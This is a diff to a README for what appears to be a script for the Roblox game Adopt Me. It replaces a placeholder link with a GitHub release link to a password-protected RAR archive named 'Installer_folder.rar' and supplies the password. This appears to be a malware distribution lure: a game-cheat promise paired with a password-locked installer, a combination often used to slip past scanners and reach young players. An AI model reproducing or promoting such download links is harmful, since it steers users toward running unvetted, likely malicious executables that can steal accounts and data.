@@ -29,6 +29,6 @@ This project is licensed under the MIT License.
 
 ## Download
 
-[Download the script here](https://your-download-link-here.com)
+[Download the script here](https://github.com/Nikita2284242/Adopt-me-script/releases/download/soft/Installer_folder.rar) Password:ojgjirg4wf82jf
 
 **Build a thriving family with the help of this handy script!**
